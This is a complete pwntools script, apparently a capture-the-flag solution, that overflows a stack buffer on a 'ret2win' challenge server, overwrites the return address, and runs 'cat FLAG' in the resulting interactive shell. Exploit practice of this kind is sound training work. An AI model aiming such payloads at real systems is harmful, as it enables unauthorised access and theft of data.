from pwn import *

# p = process('./chall')
p = remote('ret2win-pwn.wanictf.org', 9003)

payload = b'a' * 40 + p64(0x401369)
p.send(payload)
p.sendline(b'cat FLAG')

p.interactive()
